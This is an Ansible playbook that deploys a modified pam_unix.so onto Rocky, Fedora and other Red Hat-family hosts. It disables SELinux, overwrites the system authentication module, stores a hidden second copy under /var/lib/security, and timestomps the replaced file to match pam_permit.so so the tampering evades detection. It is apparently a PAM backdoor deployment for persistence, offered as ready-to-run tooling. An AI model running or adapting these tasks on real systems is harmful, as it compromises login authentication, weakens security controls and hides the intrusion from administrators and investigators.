---
- name: Gather OS facts
  ansible.builtin.setup:
    gather_subset:
      - '!all'
      - '!min'
      - distribution

- name: Set distro-specific file path for Rocky 9
  ansible.builtin.set_fact:
    pam_file_src: "rocky-9/pam_unix_rocky9.so"
  when: 
    - ansible_distribution == "Rocky"
    - ansible_distribution_major_version == "9"

- name: Set distro-specific file path for Fedora 42
  ansible.builtin.set_fact:
    pam_file_src: "fedora-42/pam_unix_fedora42.so"
  when:
    - ansible_distribution == "Fedora"
    - ansible_distribution_major_version == "42"

- name: Set generic file path for other distros
  ansible.builtin.set_fact:
    pam_file_src: "pam_unix_rhel.so"
  when: pam_file_src is not defined

- name: Ensure libtirpc is installed
  ansible.builtin.package:
    name: libtirpc
    state: present

- name: Disable SELinux (requires reboot)
  ansible.builtin.lineinfile:
    path: /etc/selinux/config
    regexp: '^SELINUX='
    line: SELINUX=disabled
  
- name: Check if deploy has been run before and backup exists
  ansible.builtin.stat:
    path: /usr/lib/pam.d/pam_unix.so
  register: mod_exist

- name: Backup old pam_unix.so (RedHat)
  ansible.builtin.copy:
    src: /usr/lib64/security/pam_unix.so
    dest: /usr/lib/pam.d/
    remote_src: yes
  when: not mod_exist.stat.exists

- name: Copy over modified pam_unix.so (RedHat)
  ansible.builtin.copy:
    src: "{{ pam_file_src }}"
    dest: /usr/lib64/security/pam_unix.so
    owner: root
    group: root
    mode: 0755

- name: Create backup backup file directory
  ansible.builtin.file:
    path: /var/lib/security
    state: directory

- name: Copy over modified file to backup backup directory
  ansible.builtin.copy:
    src: "{{ pam_file_src }}"
    dest: /var/lib/security/pam_unix.so
    owner: root
    group: root
    mode: 0755

- name: Get timestamps of other PAM modules
  ansible.builtin.stat:
    path: /usr/lib64/security/pam_permit.so
  register: pam_stat

- name: Timestomp new pam_unix.so
  ansible.builtin.file:
    path: /usr/lib64/security/pam_unix.so
    modification_time: '{{ pam_mod_time }}'
    access_time: '{{ pam_access_time }}'
  vars:
    pam_mod_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.mtime) }}'
    pam_access_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.atime) }}'

